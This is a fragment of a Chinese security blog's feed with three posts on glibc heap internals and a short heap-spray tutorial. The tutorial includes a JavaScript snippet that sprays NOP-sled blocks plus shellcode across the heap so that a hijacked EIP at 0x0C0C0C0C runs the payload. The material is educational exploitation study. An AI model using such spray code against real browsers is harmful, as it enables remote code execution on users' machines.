&#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户，见上面代码※2处。</p>
<p>6) free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</p>
<h2 id="3-Unsorted-bin"><a href="#3-Unsorted-bin" class="headerlink" title="3 Unsorted bin"></a>3 Unsorted bin</h2><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中(为什么，在什么情况下会发生这种事情呢？详情见后文)，系统就将这些chunk添加到unsorted bin中。为什么要这么做呢？这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。</p>
<p>Unsorted bin的特性如下：</p>
<p>1) unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</p>
<p>2) Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。</p>
<h2 id="4-Small-bin"><a href="#4-Small-bin" class="headerlink" title="4 Small bin"></a>4 Small bin</h2><p>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。</p>
<p>Small bin的特性如下：</p>
<p>1) small bin个数：62个。每个small bin也是一个由对应free chunk组成的循环双链表。同时Small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。</p>
<p>2) chunk size: 同一个small bin中所有chunk大小是一样的，且第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 = 508字节。</p>
<p>3) 合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。</p>
<p>4) malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理，如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了(还记得上一篇文章中在Top Chunk中留下的问题么？答案就在这里)。注意遍历后续bins以及之后的操作同样被large bin所使用，因此，将这部分内容放到large bin的malloc操作中加以介绍。</p>
<p>那么glibc malloc是如何初始化这些bins的呢？因为这些bin属于malloc_state结构体，所以在初始化malloc_state的时候就会对这些bin进行初始化，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">malloc_init_state (mstate av)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  mbinptr bin;</div><div class="line"> </div><div class="line">  <span class="comment">/* Establish circular links for normal bins */</span></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</div><div class="line">    &#123;</div><div class="line">      bin = bin_at (av, i);</div><div class="line">      bin-&gt;fd = bin-&gt;bk = bin;</div><div class="line">	&#125;</div><div class="line">……</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意在malloc源码中，将bins数组中的<strong>第一个成员索引值设置为了**</strong>1**，而不是我们常用的0(在bin_at宏中，自动将i进行了减1处理…)。从上面代码可以看出在初始化的时候glibc malloc将所有bin的指针都指向了自己——这就代表这些bin都是空的。</p>
<p>过后，当再次调用malloc(small chunk)的时候，如果该chunk size对应的small bin不为空，就从该small bin链表中取得small chunk，否则就需要交给unsorted bin及之后的逻辑来处理了。</p>
<p>5) free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，<strong>最后将新的chunk添加到unsorted bin中</strong>。</p>
<h2 id="5-Large-bin"><a href="#5-Large-bin" class="headerlink" title="5 Large bin"></a>5 Large bin</h2><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</p>
<p>Large bin的特性如下：</p>
<p>1) large bin的数量：63个。Large bin类似于small bin，只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置。</p>
<p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p>
<p>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行<strong>从大到小的排列</strong>：最大的chunk放在链表的front end，最小的chunk放在rear end。</p>
<p>2) 合并操作：类似于small bin。</p>
<p>3) malloc(large chunk)操作：</p>
<p>初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk<strong>添加到unsorted bin</strong>中。</p>
<p>如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过binmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。</p>
<p>4) Free(large chunk)：类似于small chunk。</p>
<p>了解上面知识之后，再结合下图5-1，就不难理解各类bins的处理逻辑了：</p>
<p><img src="/images/2017-09-15/420rc31ppb10.jpg" alt=""></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>至此glibc malloc中涉及到的所有显示链表技术已经介绍完毕。鉴于篇幅和精力有限，本文没能详细介绍完所有的技术细节，但是我相信带着这些知识点再去研究glibc malloc的话，定能起到事半功倍的效果。</p>
<p>另外，就我个人所了解到的基于堆溢出攻击而言，掌握以上知识，已经足够理解绝大部分堆溢出攻击技术了。因此，后面的文章将会结合这些知识详细介绍各个攻击技术的实现原理。</p>
<p>老规矩：如有错误，欢迎斧正！</p>
<p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index" target="_blank" rel="external"><strong>阿里聚安全博客 </strong></a></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Heap Spray: 堆与栈的协同攻击]]></title>
      <url>/2017/09/10/Heap-Spray-%E5%A0%86%E4%B8%8E%E6%A0%88%E7%9A%84%E5%8D%8F%E5%90%8C%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p>针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞</p>
<ol>
<li>当浏览器或其使用ActiveX空间中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞。</li>
<li>不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP</li>
<li>有时我们可能很难在浏览器中复杂的内存环境中布置完整的shellcode</li>
<li>页面中的Javascript可以申请堆内存，因此把shellcode通过Javascript布置在堆中成为可能</li>
</ol>
<p>在使用Heap Spray，一般会将EIP指向堆区的0x0C0C0C0C位置，然后用JavaScript申请大量堆内存，并用包含着0x90的“内存片”覆盖这些内存</p>
<p>通常JavaScript从内存地址向内存高址分配内存，因此申请的内存超过200MB（200MB=200 X 1024 X 1024=0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C将被含有shellcode的内存片覆盖。只要内存片中的0x90能够命中0x0C0C0C0C位置，shellcode就能执行。</p>
<p>可以用下面的方式覆盖内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var nop=unescape(&quot;%u9090%u9090&quot;);</div><div class="line">while (nop.length &lt;= 0x100000/2)</div><div class="line">&#123;</div><div class="line">    nop += nop;</div><div class="line">&#125;//生成一个1MB充满0x90的数据块</div><div class="line"></div><div class="line">nop = nop.substring(0, 0x100000/2 -32/2 -4/2 -shellcode.length -2/2);</div><div class="line">var slide = new Arrat();</div><div class="line">for (var i=0; i &lt; 200; i++)</div><div class="line">&#123;</div><div class="line">    slide[i] = nop + shellcode;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>每个内存片1MB</li>
<li>首先产生一个1MB且全为0x90的内存块</li>
<li>JavaScript会添加一些额外信息，得减去。堆块信息 32字节； 字符串长度 4字节； 结束符 2个字节的NULL</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap-spray </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux堆内存管理深入分析（上）]]></title>
      <url>/2017/09/10/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近年来，漏洞挖掘越来越火，各种漏洞挖掘、利用的分析文章层出不穷。从大方向来看，主要有基于栈溢出的漏洞利用和基于堆溢出的漏洞利用两种。国内关于栈溢出的资料相对较多，这里就不累述了，但是关于堆溢出的漏洞利用资料就很少了。鄙人以为主要是堆溢出漏洞的门槛较高，需要先吃透相应操作系统的堆内存管理机制，而这部分内容一直是一个难点。因此本系列文章主要从Linux系统堆内存管理机制出发，逐步介绍诸如基本堆溢出漏洞、基于unlink的堆溢出漏洞利用、double free、use-after-free等等常见的堆溢出漏洞利用技术。</p>
<p>前段时间偶然学习了这篇文章：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>
<p>该文是我近段时间以来读到的最好文章之一，文章浅显易懂，条例清晰，作为初学者的我从中学到了很多linux堆内存管理相关的知识。但是估计由于篇幅的限制，该文对很多难点一带而过，造成部分知识点理解上的困难。因此我决定以该文为蓝本，结合其他参考资料和自己的理解，写一篇足够详细、完整的linux堆管理介绍文章，希冀能够给其他初学者献上微末之力。所以就内容来源而言，本文主要由两部分组成：一部分是翻译的上面提及的文章；另一部分是笔者结合其他参考资料和自己的理解添加的补充说明。鉴于笔者知识能力上的不足，如有问题欢迎各位大牛斧正！</p>
<p>同样的，鉴于篇幅过长，我将文章分成了上下两部分，上部分主要介绍堆内存管理中的一些基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。后半部分主要介绍glibc malloc为了提高堆内存分配和释放的效率，引入的显示链表技术，即binlist的概念和核心原理。其中使用到的源码在：</p>
<p><a href="https://github.com/sploitfun/lsploits/tree/master/glibc" target="_blank" rel="external">https://github.com/sploitfun/lsploits/tree/master/glibc</a></p>
<p><a href="/others/files/malloc.c">malloc.c源码</a>。</p>
<h3 id="1、堆的介绍"><a href="#1、堆的介绍" class="headerlink" title="1、堆的介绍"></a>1、堆的介绍</h3><p>（1）堆在内存空间中不一定连续</p>
<p>（2）堆可由用户管理</p>
<p>常见的分配堆的方式：</p>
<ul>
<li>dlmalloc : general purpose allocator</li>
<li><font color="#f00">ptmalloc2 : glibc</font></li>
<li>jemalloc : FreeBSD 、Firefox and Android</li>
<li>tcmalloc : Google Chrome</li>
<li>libumem : Solaris</li>
</ul>
<p>本文主要学习介绍在linux glibc使用的ptmalloc2实现原理。</p>
<p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p>
<p>当然在linux平台*malloc本质上都是通过系统调用brk或者mmap实现的。关于这部分内容，<strong>一定要学习下面</strong>这篇文章：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p>
<p> 鉴于篇幅，本文就不加以详细说明了，只是为了方便后面对堆内存管理的理解，截取其中函数调用关系图：</p>
<p><img src="/images/2017-09-10/41u4qg499890.png" alt="函数调用关系图"></p>
<p>系统内存分布图：</p>
<p><img src="/images/2017-09-10/41u4qk4f6q40.png" alt="系统内存分布图"></p>
<h3 id="2、实验演示"><a href="#2、实验演示" class="headerlink" title="2、实验演示"></a>2、实验演示</h3><p>试想有如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Per thread arena example. */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">pthread_t</span> t1;</div><div class="line">        <span class="keyword">void</span>* s;</div><div class="line">        <span class="keyword">int</span> ret;</div><div class="line">        <span class="keyword">char</span>* addr;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        ret = pthread_join(t1, &amp;s);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面我们依次分析其各个阶段的堆内存分布状况。</p>
<ol>
<li><h4 id="Before-malloc-in-main-thread"><a href="#Before-malloc-in-main-thread" class="headerlink" title="Before malloc in main thread"></a>Before malloc in main thread</h4></li>
</ol>
<p>在程序调用malloc之前程序进程中是没有heap segment的，并且在创建在创建线程前，也是没有线程堆栈的。</p>
<ol start="2">
<li><h4 id="After-malloc-in-main-thread"><a href="#After-malloc-in-main-thread" class="headerlink" title="After malloc in main thread"></a>After malloc in main thread</h4></li>
</ol>
<p>在主线程中调用malloc之后，就会发现系统给程序分配了堆栈，且这个堆栈刚好在数据段之上：</p>
<p><img src="/images/2017-09-10/v2-5721084ff178629469e27bc4f386bb09_b.png" alt=""></p>
<p>这就说明它是通过brk系统调用实现的。并且，还可以看出虽然我们只申请了1000字节的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以叫做main arena(每个arena中含有多个chunk，这些chunk以链表的形式加以组织)。由于132KB比1000字节大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。</p>
<ol start="3">
<li><h4 id="After-free-in-main-thread"><a href="#After-free-in-main-thread" class="headerlink" title="After free in main thread"></a>After free in main thread</h4></li>
</ol>
<p>在主线程调用free之后：从内存布局可以看出程序的堆空间并没有被释放掉，原来调用free函数释放已经分配了的空间并非直接“返还”给系统，而是由glibc 的malloc库函数加以管理。它会将释放的chunk添加到main arenas的bin(这是一种用于存储同类型free chunk的双链表数据结构，后问会加以详细介绍)中。在这里，记录空闲空间的freelist数据结构称之为bins。之后当用户再次调用malloc申请堆空间的时候，glibc malloc会先尝试从bins中找到一个满足要求的chunk，如果没有才会向操作系统申请新的堆空间。如下图所示：</p>
<p><img src="/images/2017-09-10/v2-bf8b91202e341b07c0b7500dff5c0bb7_b.png" alt=""></p>
<ol start="4">
<li><h4 id="Before-malloc-in-thread1"><a href="#Before-malloc-in-thread1" class="headerlink" title="Before malloc in thread1"></a>Before malloc in thread1</h4></li>
</ol>
<p>在thread1调用malloc之前：从输出结果可以看出thread1中并没有heap segment，但是此时thread1自己的栈空间已经分配完毕了：</p>
<p><img src="/images/2017-09-10/v2-b16ccca0d60949c38b4873463bed752c_b.png" alt=""></p>
<ol start="5">
<li><h4 id="After-malloc-in-thread1"><a href="#After-malloc-in-thread1" class="headerlink" title="After malloc in thread1"></a>After malloc in thread1</h4></li>
</ol>
<p>在thread1调用malloc之后：从输出结果可以看出thread1的heap segment已经分配完毕了，同时从这个区域的起始地址可以看出，它并不是通过brk分配的，而是通过mmap分配，因为它的区域为b7500000-b7600000共1MB，并不是同程序的data segment相邻。同时，我们还能看出在这1MB中，根据内存属性分为了2部分：0xb7500000-0xb7521000共132KB大小的空间是可读可写属性；后面的是不可读写属性。原来，这里只有可读写的132KB空间才是thread1的堆空间，即thread1 arena。</p>
<p><img src="/images/2017-09-10/v2-4fdb53e52451ec6fa9f589427f6808b4_b.png" alt=""></p>
<ol start="6">
<li><h4 id="在thread1调用free之后：同main-thread。"><a href="#在thread1调用free之后：同main-thread。" class="headerlink" title="在thread1调用free之后：同main thread。"></a>在thread1调用free之后：同main thread。</h4></li>
</ol>
<h3 id="3、Arena介绍"><a href="#3、Arena介绍" class="headerlink" title="3、Arena介绍"></a>3、Arena介绍</h3><h4 id="3-1-Arena数量限制"><a href="#3-1-Arena数量限制" class="headerlink" title="3.1 Arena数量限制"></a>3.1 Arena数量限制</h4><p>在第2章中我们提到main thread和thread1有自己独立的arena，那么是不是无论有多少个线程，每个线程都有自己独立的arena呢？答案是否定的。事实上，arena的个数是跟系统中处理器核心个数相关的，如下表所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For 32 bit systems:</div><div class="line">     Number of arena = 2 * number of cores + 1.</div><div class="line">For 64 bit systems:</div><div class="line">     Number of arena = 8 * number of cores + 1.</div></pre></td></tr></table></figure>
<h4 id="3-2-多Arena的管理"><a href="#3-2-多Arena的管理" class="headerlink" title="3.2 多Arena的管理"></a>3.2 多Arena的管理</h4><p>假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2*核心数 + 1= 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？</p>
<p>当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。</p>
<p>当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？</p>
<p>1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。</p>
<p>2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。</p>
<p>3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。</p>
<p>这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。</p>
<h3 id="4、堆管理介绍"><a href="#4、堆管理介绍" class="headerlink" title="4、堆管理介绍"></a>4、堆管理介绍</h3><h4 id="4-1-整体介绍"><a href="#4-1-整体介绍" class="headerlink" title="4.1 整体介绍"></a>4.1 整体介绍</h4><p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ol>
<li>heap_info: 即Heap Header，因为一个<strong>thread arena</strong>（注意：不包含<strong>main thread</strong>）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。那么在什么情况下一个thread arena会包含多个heaps呢?在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></div><div class="line">&#123;</div><div class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></div><div class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></div><div class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></div><div class="line">                           PROT_READ|PROT_WRITE.  */</div><div class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></div><div class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</div><div class="line">     MALLOC_ALIGNMENT. */</div><div class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</div><div class="line">&#125; heap_info;</div></pre></td></tr></table></figure>
<ol start="2">
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等(这些概念会在后文详细介绍):</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">&#123;</div><div class="line">  <span class="comment">/* Serialize access.  */</span></div><div class="line">  <span class="keyword">mutex_t</span> mutex;</div><div class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line">  <span class="keyword">int</span> flags;</div><div class="line">  <span class="comment">/* Fastbins */</span></div><div class="line">  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line">  mchunkptr top;</div><div class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line">  mchunkptr last_remainder;</div><div class="line">  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line">  <span class="comment">/* Bitmap of bins */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line">  <span class="comment">/* Linked list */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line">  <span class="comment">/* Linked list for free arenas.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line">  INTERNAL_SIZE_T system_mem;</div><div class="line">  INTERNAL_SIZE_T max_system_mem;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ol start="3">
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小(这里给“就是”加上引号，说明这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文)。每个chunk都由一个结构体malloc_chunk表示：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
